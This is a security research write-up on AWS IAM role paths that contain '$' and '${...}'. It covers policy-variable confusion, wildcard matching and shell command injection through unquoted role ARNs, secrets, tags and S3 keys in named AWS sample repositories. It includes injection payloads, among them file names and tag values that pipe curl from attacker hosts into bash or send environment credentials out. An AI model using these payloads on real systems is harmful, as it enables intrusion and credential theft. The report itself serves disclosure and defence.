# IAM Role ARN with Dollar Sign ($) - Deep Research

## Executive Summary

While AWS IAM **role names** cannot contain a `$` character, IAM **role paths** can. This creates an under-explored attack surface where role ARNs containing `${...}` patterns in their path component can be confused with IAM policy variable substitution during policy evaluation.

---

## 1. IAM Role Naming Constraints

### Role Name (cannot contain `$`)

The `RoleName` parameter in the `CreateRole` API is restricted to:

```
Regex: [\w+=,.@-]+
Allowed: a-z, A-Z, 0-9, _ + = , . @ -
Max length: 64 characters
```

The dollar sign `$` is **NOT** in this allowed set. Any attempt to create a role with `$` in the name will be rejected server-side, regardless of whether you use the Console, CLI, SDK, CloudFormation, Terraform, or CDK.

### Role Path (CAN contain `$`)

The `Path` parameter uses a much more permissive regex:

```
Regex: (\u002F)|(\u002F[\u0021-\u007E]+\u002F)
```

This allows **any printable ASCII character** from `!` (U+0021) through `~` (U+007E) between the leading and trailing `/`. This explicitly includes:

| Character | Hex Code | Allowed in Path? |
|-----------|----------|-------------------|
| `$`       | U+0024   | **YES**           |
| `{`       | U+007B   | **YES**           |
| `}`       | U+007D   | **YES**           |
| `*`       | U+002A   | **YES**           |
| `?`       | U+003F   | **YES**           |

Path constraints:
- Must start and end with `/`
- Max 512 characters
- The Console does **not** support setting paths; you must use CLI/API/IaC

---

## 2. How to Create an IAM Role ARN with `$`

Since `$` is allowed in the **path** (not the name), you can create a role with `$` in the path via the AWS CLI:

```bash
# Create trust policy
cat > trust-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Create role with $ in the path
aws iam create-role \
  --role-name MyRole \
  --path '/$dollar-path/' \
  --assume-role-policy-document file://trust-policy.json
```

This produces an ARN like:

```
arn:aws:iam::123456789012:role/$dollar-path/MyRole
```

### More dangerously, you can mimic IAM policy variable patterns:

```bash
aws iam create-role \
  --role-name MyRole \
  --path '/${aws:username}/' \
  --assume-role-policy-document file://trust-policy.json
```

Resulting ARN:

```
arn:aws:iam::123456789012:role/${aws:username}/MyRole
```

The same can be done via CloudFormation or Terraform:

```yaml
# CloudFormation
MyRole:
  Type: AWS::IAM::Role
  Properties:
    RoleName: MyRole
    Path: "/${dollar}/"
    AssumeRolePolicyDocument: ...
```

```hcl
# Terraform
resource "aws_iam_role" "example" {
  name = "MyRole"
  path = "/$${dollar}/"  # $$ escapes to literal $ in HCL
  assume_role_policy = "..."
}
```

---

## 3. Security Implications

### 3.1 Policy Variable Confusion Attack

IAM policies (version `2012-10-17`) treat `${...}` as **policy variables** that are substituted at evaluation time. When a role ARN containing `${...}` in its path appears in a policy `Resource` element, there is ambiguity:

**Scenario:** An administrator creates a role with path `/${aws:username}/`:
```
arn:aws:iam::123456789012:role/${aws:username}/AdminRole
```

If this ARN is copied into a policy's `Resource` field:
```json
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::123456789012:role/${aws:username}/AdminRole"
}
```

IAM's policy engine will interpret `${aws:username}` as a **variable**, substituting it with the requesting user's actual username. This means:
- User `alice` can assume `arn:aws:iam::123456789012:role/alice/AdminRole`
- User `bob` can assume `arn:aws:iam::123456789012:role/bob/AdminRole`
- **Neither** user can assume the *actual* role at `arn:aws:iam::123456789012:role/${aws:username}/AdminRole`

The policy author's intent (granting access to one specific role) is completely subverted.

### 3.2 Wildcard Characters in Role Paths

Since `*` and `?` are valid path characters, a role path can contain literal wildcards:

```
arn:aws:iam::123456789012:role/*/EscalationRole
```

When this ARN appears in policy conditions using `ArnEquals` or `ArnLike` (both support wildcards), the `*` is interpreted as a wildcard matching any string, not as a literal asterisk. This is especially dangerous because many developers incorrectly assume `ArnEquals` performs exact string matching.

### 3.3 Tag Value Injection via `${aws:PrincipalTag}`

A documented privilege escalation vector:

1. Policy uses: `"Resource": "arn:aws:iam::111122223333:role/${aws:PrincipalTag/AllowedRole}/*"`
2. Attacker with `iam:TagUser` sets their `AllowedRole` tag to `*`
3. Substituted Resource becomes: `arn:aws:iam::111122223333:role/*/*`
4. This matches **ALL roles** in the account

### 3.4 Terraform/HCL `${}` Interpolation Conflicts

Terraform's HCL uses the same `${}` syntax for variable interpolation. When defining IAM policies containing `${aws:username}`:
- Must be escaped as `$${aws:username}` in HCL
- Historical bugs caused `$$` to remain unescaped, deploying policies with literal `$$` that silently failed to match
- This can result in policies that are either over-permissive or silently broken

### 3.5 ARN Regex Validation Gaps

Community and tool-maintained regex patterns for ARN validation commonly:
- Don't account for `$`, `{`, `}`, `*`, `?` in role paths
- Use `$` as a regex anchor, conflicting with literal `$` in ARNs
- Oversimplify path components
- May cause false rejections or false acceptances

### 3.6 ArnEquals vs ArnLike -- Both Support Wildcards

A critical misconception: unlike `StringEquals` vs `StringLike`, **both `ArnEquals` and `ArnLike` interpret `*` and `?` as wildcards**. A developer who assumes `ArnEquals` means "exact match" will write policies that are more permissive than intended when ARNs contain wildcard characters.

### 3.7 Wildcards Span ARN Segments

If `*` appears as the last character of a resource ARN segment in a policy, it can match **beyond colon and slash boundaries**. An incomplete ARN like `arn:aws:iam` is auto-completed to `arn:aws:iam:*:*:*`, matching all IAM resources across all accounts and regions.

---

## 4. Escape Mechanisms

### In IAM Policies

| Escape | Literal Result | Context |
|--------|---------------|---------|
| `${$}` | `$`           | Policy documents (version 2012-10-17) |
| `${*}` | `*`           | Policy documents (version 2012-10-17) |
| `${?}` | `?`           | Policy documents (version 2012-10-17) |

### In CloudFormation

Use `${!LiteralDollar}` to escape `$` in `!Sub` expressions.

### In Terraform/HCL

Use `$$` to produce a literal `$` in string interpolation contexts.

### Policy Version Dependency

Variable substitution **only** works with `"Version": "2012-10-17"`. With the older `"2008-10-17"`, `${aws:username}` is treated as a literal string.

---

## 5. Documentation Inconsistency

AWS documentation is inconsistent about path character restrictions:

| Source | Allowed Path Characters |
|--------|------------------------|
| CreateRole API reference (regex) | `\u0021` - `\u007E` (all printable ASCII except space) |
| IAM Identifiers page | `\u0021` - `\u007F` (includes DEL) |
| IAM & STS Quotas page | Alphanumeric + `_ + = , . @ -` only |

The API-level regex is the authoritative source since it governs server-side validation. The quotas page describes the *recommended* (not enforced) character set.

---

## 6. Shell/Command Injection via Role Paths in AWS GitHub Repos

IAM role paths can contain shell metacharacters like `$`, backticks, `{`, `}`, `(`, `)`, `;`, `|`, etc. If a role ARN with a malicious path (e.g., containing `$(id)`) is passed unsafely to shell commands, **OS command injection** occurs. The following patterns were identified across AWS's GitHub repositories:

### 6.1 `awslabs/awscli-aliases` — PR #25: `eval` with Unquoted Role ARN

**Repo:** [awslabs/awscli-aliases PR #25](https://github.com/awslabs/awscli-aliases/pull/25/files)

The PR adds a `switch-role` alias designed to be used as:
```bash
eval $(aws switch-role $1)
```

The alias itself uses unquoted `${1}` for the role ARN:
```bash
switch-role = !f() {
aws --profile ${AWS_PROFILE:-default} sts assume-role --role-arn ${1} \
  --role-session-name "${USER}@${HOSTNAME}" \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text | \
(read KEY SECRET TOKEN; echo "export AWS_ACCESS_KEY_ID=\"$KEY\"; ...")
}; f
```

**Injection vector:** If `$1` contains `$(id)` or backticks, the shell interprets the command substitution *before* passing it to the AWS CLI. The `eval` wrapper compounds the risk by executing the output as shell code.

### 6.2 The `$EKS_KUBECTL_ROLE_ARN` Anti-Pattern — Origin and Proliferation

This is the most significant finding: an **unquoted role ARN variable** originating from the **official AWS EKS Workshop** that has been systematically copied across the ecosystem.

**Origin:** [aws-samples/eks-workshop CloudFormation template](https://github.com/aws-samples/eks-workshop/blob/main/templates/ci-cd-codepipeline.cfn.yml)

The CloudFormation template takes a user-supplied `KubectlRoleName` parameter, constructs an ARN via `!Sub`, and passes it as an environment variable to CodeBuild:
```yaml
EKS_KUBECTL_ROLE_ARN:
  Value: !Sub arn:aws:iam::${AWS::AccountId}:role/${KubectlRoleName}
```

The corresponding buildspec then uses this ARN **unquoted**:
```bash
CREDENTIALS=$(aws sts assume-role --role-arn $EKS_KUBECTL_ROLE_ARN \
  --role-session-name codebuild-kubectl --duration-seconds 900)
```

**Proliferation:** This pattern has been copied into at least these repos:

| Repo | File |
|------|------|
| [aws-samples/kubernetes-for-java-developers](https://github.com/aws-samples/kubernetes-for-java-developers/blob/master/buildspec.yml) | `buildspec.yml` |
| [rnzsgh/eks-workshop-sample-api-service-go](https://github.com/rnzsgh/eks-workshop-sample-api-service-go/blob/master/buildspec.yml) | `buildspec.yml` (official EKS Workshop sample) |
| [aquasecurity/amazon-eks-devsecops](https://github.com/aquasecurity/amazon-eks-devsecops/blob/master/buildspec.yml) | `buildspec.yml` |
| Multiple StackSimplify, Medium, and DEV Community tutorials | Various |

**Injection vector:** If the role ARN contains `$(id)` in its path, the unquoted variable expansion causes the shell to execute `id` as a command substitution *before* passing the result to the AWS CLI. In CodeBuild, this executes with the CodeBuild service role's permissions.

### 6.2a `aws-samples/amazon-eks-refarch-cloudformation` — Unquoted Makefile Variable

**Repo:** [aws-samples/amazon-eks-refarch-cloudformation](https://github.com/aws-samples/amazon-eks-refarch-cloudformation)

```makefile
# Used in create-eks-cluster, update-eks-cluster, delete-eks-cluster targets
@aws --region $(REGION) cloudformation delete-stack \
  --role-arn $(EKS_ADMIN_ROLE) --stack-name "$(CLUSTER_STACK_NAME)"
```

While `$(...)` in Makefile context is Make variable expansion (not shell command substitution), if the resolved value contains shell metacharacters, they will be interpreted when the recipe line is executed by the shell.

### 6.2b `aws-samples/sample-enable-eks-auto-mode-using-github-actions` — Unquoted `$ROLE_ARN` with eksctl

**Repo:** [aws-samples/sample-enable-eks-auto-mode-using-github-actions](https://github.com/aws-samples/sample-enable-eks-auto-mode-using-github-actions)

```bash
eksctl delete iamidentitymapping \
  --cluster $cluster --region $AWS_REGION --arn $ROLE_ARN
```

The `$ROLE_ARN` comes from GitHub secrets (`AWS_ROLE_ARN`) and is used unquoted in shell commands.

### 6.3 CVE-2025-5277: `alexei-led/aws-mcp-server` — Command Injection (CVSS 9.6)

**Repo:** [alexei-led/aws-mcp-server](https://github.com/alexei-led/aws-mcp-server)
**Advisory:** [GHSA-m4qw-j7mx-qv6h](https://github.com/advisories/GHSA-m4qw-j7mx-qv6h)
**Fix Commit:** [94d20ae](https://github.com/alexei-led/aws-mcp-server/commit/94d20ae1798a43ac7e3a28e71900d774e5159c8a)

The `cli_executor.py` module executed AWS CLI commands without proper input sanitization. Shell metacharacters (`;`, `|`, `&&`, `||`, `` ` ``, `$()`) in MCP request parameters — including role ARNs — were interpreted by the shell.

The fix introduced `validate_aws_command()` and `validate_pipe_command()` functions to sanitize input before execution.

**Timeline:** Disclosed April 8, 2025. Partially fixed April 10. CVE published May 28, 2025.

### 6.4 `aws/aws-parallelcluster-node` — Confirmed Subprocess Injection (Fixed v3.5.0)

**Repo:** [aws/aws-parallelcluster-node](https://github.com/aws/aws-parallelcluster-node)
**Vulnerable files:** `src/common/schedulers/slurm_commands.py`, `src/common/utils.py`
**Fix commit:** `47012a17bd`

Prior to v3.5.0, `slurm_commands.py` constructed shell commands via **f-string formatting** and passed them to `subprocess` with **`shell=True`**, without sanitizing inputs. Vulnerable functions included:

```python
# update_nodes() — unsanitized reason, nodenames, state interpolated into shell command
f'{SCONTROL} update nodename={nodenames} state={state} reason="{reason}"'

# update_partitions() — unsanitized partition and state
f"{SCONTROL} update partitionname={partition} state={state}"

# get_nodes_info() — nodes injected directly into piped shell command
f'{SCONTROL} show nodes {nodes} | awk ...'
```

These commands ran with **sudo privileges** (clustermgtd runs as cluster admin). The fix added `validate_subprocess_argument()` which rejects `&`, `|`, `;`, `$`, `>`, `<`, backtick, `\`, `!`, `#`, and `\n` characters.

While this specific case involved Slurm parameters rather than IAM role ARN paths, it demonstrates the **exact vulnerability class**: infrastructure identifiers with shell metacharacters flowing into subprocess calls with `shell=True`.

### 6.5 `aws/aws-cdk` — `shell: true` in Cloud Assembly Execution

**Repo:** [aws/aws-cdk](https://github.com/aws/aws-cdk)
**File:** `packages/aws-cdk/lib/api/cxapp/exec.ts`

The CDK CLI's `exec.ts` uses:
```typescript
childProcess.spawn(commandAndArgs, { shell: true, ... })
```

to execute the cloud assembly app command. While role ARNs passed via `--role-arn` are handled through the SDK (not shell), the use of `shell: true` with inherited process environment means any environment variable containing shell metacharacters would be expanded by the shell.

Additionally, [aws/aws-cdk-cli Issue #1175](https://github.com/aws/aws-cdk-cli/issues/1175) reports that `cdk import --role-arn <ARN>` incorrectly interprets the ARN as a file path for `--record-resource-mapping`, meaning ARN strings are treated as filesystem paths — a logic confusion bug.

### 6.6 Widespread `eval $(assume-role ...)` Community Pattern

The extremely common pattern for assuming roles in shell scripts:
```bash
eval $(aws sts assume-role --role-arn "$ROLE_ARN" ... | jq -r '...')
```

This is referenced in:
- [remind101/assume-role](https://github.com/remind101/assume-role) — `eval $(assume-role prod)`
- [AWS CLI Issue #7546](https://github.com/aws/aws-cli/issues/7546) — Feature request for `aws sts assume-role` to output shell-compatible variable definitions
- Multiple community gists and blog posts

When the role ARN is sourced from an untrusted input (API response, config file, environment variable), and the `eval` pattern is used, a malicious role path containing `$(malicious-command)` will execute the injected command.

### 6.7 `aws/aws-cli` — `export-credentials --format env` with Unquoted `eval`

**Repo:** [aws/aws-cli](https://github.com/aws/aws-cli)
**Issues:** [#7388](https://github.com/aws/aws-cli/issues/7388), [#8187](https://github.com/aws/aws-cli/issues/8187), [#8284](https://github.com/aws/aws-cli/issues/8284)

The officially documented pattern is:
```bash
eval $(aws configure export-credentials --profile dev --format env)
```

The `--format env` output was reported to produce **unquoted** values:
```
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxx
export AWS_SESSION_TOKEN=xxxxx
```

Issue [#8187](https://github.com/aws/aws-cli/issues/8187) reported that unquoted values caused failures, and the reporter recommended quoting. Issue [#8284](https://github.com/aws/aws-cli/issues/8284) reported PowerShell format quoting bugs that corrupted session tokens containing `=`. The AWS CLI team acknowledged in [#4479](https://github.com/aws/aws-cli/issues/4479) that "printing commands that can be eval'd has in general been a painpoint."

### 6.8 `aws/rolesanywhere-credential-helper` — Unquoted `${ROLE_ARN}` in README

**Repo:** [aws/rolesanywhere-credential-helper](https://github.com/aws/rolesanywhere-credential-helper)

The README demonstrates usage with **unquoted** variables:
```bash
/path/to/aws_signing_helper credential-process \
 --certificate /path/to/certificate/file \
 --private-key handle:${CHILD_HANDLE} \
 --role-arn ${ROLE_ARN} \
 --trust-anchor-arn ${TA_ARN} \
 --profile-arn ${PROFILE_ARN}
```

All ARN variables (`${ROLE_ARN}`, `${TA_ARN}`, `${PROFILE_ARN}`) are unquoted. The `credential-process` output is consumed by the AWS SDK's `credential_process` feature, which could feed into further shell contexts. Additionally, the MacOS Keychain example uses an unquoted password variable:
```bash
security unlock-keychain -p ${CREDENTIAL_HELPER_KEYCHAIN_PASSWORD} credential-helper.keychain
```

### 6.9 `aws-ia/terraform-aws-control_tower_account_factory` — ARN Construction from Shell Variables

**Repo:** [aws-ia/terraform-aws-control_tower_account_factory](https://github.com/aws-ia/terraform-aws-control_tower_account_factory)
**Issue:** [#219](https://github.com/aws-ia/terraform-aws-control_tower_account_factory/issues/219)

The `creds.sh` script constructs ARNs from shell variables:
```bash
CREDENTIALS=$(aws sts assume-role \
  --role-arn "arn:${AWS_PARTITION}:iam::${AFT_MGMT_ACCOUNT}:role/${AFT_MGMT_ROLE}" \
  --role-session-name "${ROLE_SESSION_NAME}")
```

While the outer variable is quoted, the ARN is built from multiple environment variables (`${AWS_PARTITION}`, `${AFT_MGMT_ACCOUNT}`, `${AFT_MGMT_ROLE}`) that could individually contain injection payloads. When `${AWS_PARTITION}` was unset, it produced malformed ARNs. In a multi-tenant environment, if any of these component variables are attacker-influenced, injection is possible within the quoted string via the component values themselves.

### 6.10 `aws-actions/configure-aws-credentials` — Character Sanitization (Safe)

**Repo:** [aws-actions/configure-aws-credentials](https://github.com/aws-actions/configure-aws-credentials)

The GitHub Action sanitizes special characters in `GITHUB_ACTOR` and `GITHUB_WORKFLOW` when used in session tags (replacing invalid characters with `*`). The `role-to-assume` input parameter is passed directly to the AWS SDK, not through a shell — making it resistant to this class of injection. The Action also handles special characters in `AWS_SECRET_ACCESS_KEY` via a retry mechanism ([Issue #599](https://github.com/aws-actions/configure-aws-credentials/issues/599)).

### 6.11 Safe Patterns (for contrast)

The official AWS sample repos generally use the safer pattern:
```bash
# aws-samples/cicd-lambda-container/assume-role.sh
cred=$(aws sts assume-role --role-arn "$ROLE" \
  --role-session-name "$SESSION_NAME" \
  --query '[Credentials.AccessKeyId,Credentials.SecretAccessKey,Credentials.SessionToken]' \
  --output text)
export AWS_ACCESS_KEY_ID=$(echo "$cred" | awk '{ print $1 }')
```

Key safety features: **quoted variables** (`"$ROLE"`), **no `eval`**, and credentials parsed via `awk` rather than shell execution.

---

## 7. Broader Attack Surface — Other AWS Identifiers in Shell Commands

The role ARN injection patterns in Section 6 are part of a much larger class: **any AWS identifier with user-controlled characters that flows into a shell command without proper quoting**. This section catalogs other AWS value types that are vulnerable.

### 7.1 SSM Parameter Store & Secrets Manager Values

SSM Parameter values and Secrets Manager secrets are **arbitrary strings** — they can contain any character including `$()`, backticks, semicolons, pipes, and newlines. They are routinely fetched at runtime and interpolated into shell commands.

#### 7.1a `aws-samples/aws-lambda-environmental-variables-from-aws-secrets-manager` — `eval`/`source` of Secret Values (CRITICAL)

**Repo:** [aws-samples/aws-lambda-environmental-variables-from-aws-secrets-manager](https://github.com/aws-samples/aws-lambda-environmental-variables-from-aws-secrets-manager)
**File:** `src/get-secrets-layer` (bash wrapper script)

```bash
echo "${values}" | while read -r line; do
    ARRY=(${line//|/ })
    key="${ARRY[0]}"
    unset ARRY[0]
    value="${ARRY[@]}"
    echo "export ${key}=\"${value}\"" >> ${tempFile}
done

. ${tempFile}  # Sources the file — executes any embedded commands
```

The script retrieves secrets from AWS Secrets Manager, writes `export KEY="VALUE"` statements to a temp file, and **sources it**. If a secret value contains `"$(malicious_command)"`, the double-quote escaping is trivially broken and arbitrary commands execute during Lambda cold start. An attacker who can modify Secrets Manager values (e.g., via compromised IAM credentials) achieves RCE inside the Lambda function.

#### 7.1b `aws-samples/aws-reinvent2018-keeping-secrets` — Unquoted MySQL Password (HIGH)

**Repo:** [aws-samples/aws-reinvent2018-keeping-secrets](https://github.com/aws-samples/aws-reinvent2018-keeping-secrets/blob/master/keeping-secrets-wp-20181119.yaml)

Presented at **re:Invent 2018 SEC353** as the recommended "keeping secrets" pattern:

```bash
secret=$(aws secretsmanager get-secret-value --secret-id ${WPDBSecretName} \
    --region ${AWS::Region} | jq .SecretString | jq fromjson)
user=$(echo $secret | jq -r .username)
password=$(echo $secret | jq -r .password)

mysql -p$password -u $user -P $port -h $endpoint
```

All variables are **unquoted**. The `mysql -p$password` pattern means shell metacharacters in the password are interpreted before `mysql` sees them. The `echo $secret` (without quotes) is subject to word splitting and globbing.

#### 7.1c `aws-samples/aws-secretsmgr-workshop` — Same MySQL Pattern (HIGH)

**Repo:** [aws-samples/aws-secretsmgr-workshop](https://github.com/aws-samples/aws-secretsmgr-workshop/blob/master/site/RDSFargate/RDSFargate.yml)

Identical unquoted `mysql -p$password` pattern in a workshop CloudFormation template that participants deploy, further propagating the anti-pattern.

#### 7.1d `aws-samples/sample-logistics-agent-agentcore-runtime` — Unquoted psql Credentials (MEDIUM-HIGH)

**Repo:** [aws-samples/sample-logistics-agent-agentcore-runtime](https://github.com/aws-samples/sample-logistics-agent-agentcore-runtime)

```bash
DB_SECRET_ARN=$(aws ssm get-parameter --name /agentcore/rds/secret-arn \
  --query 'Parameter.Value' --output text)
DB_CREDENTIALS=$(aws secretsmanager get-secret-value \
  --secret-id $DB_SECRET_ARN --query 'SecretString' --output text)
DB_USERNAME=$(echo $DB_CREDENTIALS | jq -r '.username')
DB_PASSWORD=$(echo $DB_CREDENTIALS | jq -r '.password')

PGPASSWORD=$DB_PASSWORD psql -h $DB_ENDPOINT -U $DB_USERNAME -d company_logistics_db -f schema.sql
```

Multiple injection points: `$DB_SECRET_ARN` unquoted in `--secret-id`, `$DB_CREDENTIALS` echoed without quotes (word splitting), `PGPASSWORD=$DB_PASSWORD` unquoted on the `psql` command line.

#### 7.1e `aws-samples/amazon-eks-jenkins-terraform` — Docker Login with Unquoted SSM Password (MEDIUM)

**Repo:** [aws-samples/amazon-eks-jenkins-terraform](https://github.com/aws-samples/amazon-eks-jenkins-terraform/blob/master/buildspec.yml)

```yaml
env:
  parameter-store:
    LOGIN_PASSWORD: /CodeBuild/dockerLoginPassword
phases:
  pre_build:
    commands:
      - docker login -u $LOGIN_USER -p $LOGIN_PASSWORD
```

CodeBuild fetches SSM parameters as environment variables, then uses them **unquoted** in `docker login`. The safer pattern is `echo "$LOGIN_PASSWORD" | docker login --username "$LOGIN_USER" --password-stdin`.

### 7.2 AWS Resource Tag Values

Tag values allow nearly arbitrary Unicode characters (up to 256 chars), including `$`, backticks, `;`, `|`, `()`, spaces, and more. Tags are commonly read by automation scripts (user-data, Lambda, CI/CD) and used in shell commands.

**Key insight:** The `ec2:CreateTags` permission is often granted broadly because it appears low-risk. However, when combined with any of the patterns below, it becomes a **privilege escalation vector** — an IAM principal with only `ec2:CreateTags` can achieve root-level code execution on instances that consume those tags (user-data scripts run as root).

#### 7.2a `aws-samples/single-ec2-cdk` — Unquoted Tag in `hostnamectl` and Route53 (HIGH)

**Repo:** [aws-samples/single-ec2-cdk](https://github.com/aws-samples/single-ec2-cdk/blob/main/userdata/user_script.sh)

```bash
HOST=`aws ec2 describe-tags --filters "Name=resource-id,Values=$INSTANCE_ID" \
  "Name=key,Values=nickName" | jq -r .Tags[].Value`
DOMAIN=`aws ec2 describe-tags --filters "Name=resource-id,Values=$INSTANCE_ID" \
  "Name=key,Values=domainName" | jq -r .Tags[].Value`

hostnamectl set-hostname $HOST.$DOMAIN
```

`$HOST` and `$DOMAIN` are unquoted. A tag value like `foo$(curl attacker.com/shell.sh|bash)` would be executed by the shell when passed to `hostnamectl`. The variables are also used to construct Route53 DNS records.

#### 7.2b `eval $(ec2-tags)` — The Most Dangerous Pattern (CRITICAL)

Multiple widely-copied patterns convert EC2 tags into shell `export` statements and then `eval` or `source` them:

**[ambakshi/ec2-tags](https://github.com/ambakshi/ec2-tags)** — documented usage:
```bash
eval "$(ec2-tags -i -s -e)"
source <(ec2-tags -i -s -e)
```

**[Gist: marcellodesales](https://gist.github.com/marcellodesales/a890b8ca240403187269):**
```bash
for key in $(echo $tags | /usr/bin/jq -r ".[][].Key"); do
    value=$(echo $tags | /usr/bin/jq -r ".[][] | select(.Key==\"$key\") | .Value")
    export $key="$value"
done
```

**[Gist: sysboss](https://gist.github.com/sysboss/e2a119a391da8f9f3e660289aefd8ab7):**
```bash
for i in $(seq 0 ${COUNT}); do
    declare "$(getTagKey $i)=$(getTagValue $i)"
done
```

Any tag value containing shell metacharacters is executed as code. A tag **key** like `PATH` or `LD_PRELOAD` would overwrite critical environment variables. The `declare`/`export` patterns don't sanitize `$()`, backticks, or semicolons.

This pattern is promoted in [Andrei Maksimov's widely-read Medium article](https://andreimaksimov.medium.com/how-to-put-aws-ec2-tags-to-environment-variables-45b5d2a15b88) as a recommended practice.

#### 7.2c Tag Values in S3 Paths — Download and Execute Arbitrary Objects (HIGH)

**[Gist: daviddyball](https://gist.github.com/daviddyball/a7d1443964030f2c3730):**

```bash
ROLE=$(echo "$TAGS" | grep Role | awk '{print $3}')
ENVIRONMENT=$(echo "$TAGS" | grep Environment | awk '{print $3}')

aws s3 cp s3://my-configs/${ENVIRONMENT}/${ROLE}/bootstrap.sh \
  /root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
chmod +x /root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
/root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
```

Tag values are interpolated unquoted into an S3 path, the downloaded file is made executable, and **executed**. A tag value containing `../` could traverse paths to download an attacker-controlled S3 object.

#### 7.2d Tag Values in `sed` — File Content Injection (MEDIUM)

**[calvintrobinson/AWS-Hostname-Change-Based-on-Tag-Scripts](https://github.com/calvintrobinson/AWS-Hostname-Change-Based-on-Tag-Scripts/blob/master/LINUX-AWS-Hostname-from-Tag.sh):**

```bash
HN=$(aws ec2 describe-tags ... --output=text | cut -f5)
sed -i 's/'"$hostn/$HN"'/g' $hostnamefile
sed -i 's/'"$hostn/$HN"' /g' $hostsfile
```

Tag value `$HN` is interpolated into a `sed` substitution pattern. A value containing `/` or `&` characters breaks or hijacks the sed command, enabling content injection into `/etc/hostname` or `/etc/hosts`.

#### 7.2e Tag Values in fstab — Mount Point Injection (MEDIUM)

**[blog.hcf.dev](https://blog.hcf.dev/article/2018-08-22-aws-user-data-script):**

```bash
mntpt=$(ec2-get-tag-value ${volume} mntpt)
mkdir -p ${mntpt}
echo "UUID=${uuid} ${mntpt} ${fstype} defaults 0 2" >> /etc/fstab
```

Tag values appended directly into `/etc/fstab`. A `mntpt` value containing newlines could inject additional fstab entries. The unquoted `mkdir -p ${mntpt}` is subject to word splitting and globbing.

### 7.3 S3 Object Keys

S3 object keys can contain **almost any byte** including `$()`, backticks, semicolons, pipes, newlines, spaces, and quotes. The only real limits are 1024 bytes and UTF-8 encoding. This is a well-documented attack vector in serverless architectures (OWASP Serverless Top 10), but vulnerable patterns persist across tutorials and samples.

#### 7.3a S3-Triggered Lambda with `Popen(shell=True)` — Canonical Injection (CRITICAL)

**Source:** [riyazwalikar/pentestawslambda](https://github.com/riyazwalikar/pentestawslambda/blob/master/Pentesting-AWS-Lambda-Functions.md)

```python
def s3trigger(event, context):
    for record in event['Records']:
        key = record['s3']['object']['key']
        cmd = 'ls -ltra /tmp/' + key
        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE)
```

An attacker uploading a file named `; curl attacker.com/steal?$(env | base64) #` achieves full RCE and credential exfiltration.

#### 7.3b ClamAV Lambda Scanner — Security Tool with Injection (CRITICAL)

**Source:** [DEV Community tutorial by sutt0n](https://dev.to/sutt0n/scanning-files-on-lambda-with-a-clamav-lambda-layer-475c) (widely-read)

```javascript
const scanStatus = execSync(
  `clamscan --database=/opt/var/lib/clamav /tmp/${record.s3.object.key}`
);
```

S3 object key interpolated directly into `execSync` via template literals. A *security tool* (virus scanner) is itself vulnerable to command injection.

#### 7.3c OWASP DVSA — S3 Upload Feedback Lambda (CRITICAL, intentionally vulnerable)

**Source:** [OWASP/DVSA](https://github.com/OWASP/DVSA)

The `DVSA-FEEDBACK-UPLOADS` Lambda processes S3 event notifications. Input validation (`is_safe()` checking for `;`, `'`, `|`) was **commented out**, always returning `True`.

**Exploit filename:** `Order.png;curl https://attacker.ngrok.io?$(env | base64 -wrap-0); echo.pdf`

#### 7.3d `aws-samples/spark-on-aws-lambda` — Event Data to Environment Variables (HIGH)

**Repo:** [aws-samples/spark-on-aws-lambda](https://github.com/aws-samples/spark-on-aws-lambda)

```python
def spark_submit(s3_bucket_script, input_script, event):
    for key, value in event.items():
        os.environ[key] = value  # Arbitrary event data -> env vars
    subprocess.run(["spark-submit", ...], env=os.environ)
```

While `subprocess.run` uses a list (not `shell=True`), writing arbitrary event data to environment variables allows overriding `PATH`, `LD_PRELOAD`, or other sensitive variables.

#### 7.3e AWS Official Bash Docs — Unquoted S3 Key Iteration (MEDIUM)

**Source:** [AWS SDK Code Examples — Bash S3](https://docs.aws.amazon.com/code-library/latest/ug/bash_2_s3_code_examples.html)

```bash
function delete_items_in_bucket() {
  local keys=$2
  for key in $keys; do  # UNQUOTED — word splitting on spaces, glob expansion
    delete_items="$delete_items{\"Key\": \"$key\"},"
  done
}
```

`$keys` is unquoted, causing word splitting on spaces and glob expansion on `*`, `?`, `[]` characters. Official AWS documentation demonstrating unsafe shell handling of S3 keys.

#### 7.3f S3 Key URL Encoding — Validation Bypass (MEDIUM)

**Source:** [aws-samples/amazon-textract-enhancer Issue #2](https://github.com/aws-samples/amazon-textract-enhancer/issues/2)

S3 event notifications URL-encode the object key (`my test.pdf` → `my+test.pdf`). Input validation checking for `;` or `|` in the raw event key may miss URL-encoded variants (`%3B`, `%7C`) that get decoded *after* the check.

### 7.4 STS External IDs, Session Names & Other Identity Values

| Identifier | Character Set | Max Length | Risk |
|---|---|---|---|
| **External ID** (`--external-id`) | Any string | 2-1224 chars | High — often from third parties |
| **Role session name** | `[a-zA-Z0-9+=,.@-_]` | 64 chars | Low — limited charset |
| **IAM usernames** | `[a-zA-Z0-9+=,.@-_]` + path `/` | 64 chars | Low-Medium |
| **OIDC token claims** | Arbitrary (from IdP) | Varies | High — user-controlled strings |
| **CloudFormation parameter values** | Arbitrary user input | 4096 chars | High — flows to UserData/custom resources |

Notable: **no official AWS sample repos use `--external-id` in shell scripts at all**. The `aws-doc-sdk-examples` bash `sts_assume_role()` function only accepts session name and role ARN — external ID is entirely absent. However, external IDs can be any string 2-1224 chars with no character restrictions, so any script that passes one to a shell command without quoting would be vulnerable.

#### 7.4a CloudFormation Parameter Values in UserData — Structural Risk (MEDIUM-HIGH)

CloudFormation templates commonly use `!Sub` to interpolate parameters into UserData bash scripts:

```yaml
UserData:
  Fn::Base64: !Sub |
    #!/bin/bash
    echo "Setting up ${DatabaseName}"
    mysql -u admin -p${DatabasePassword} ...
```

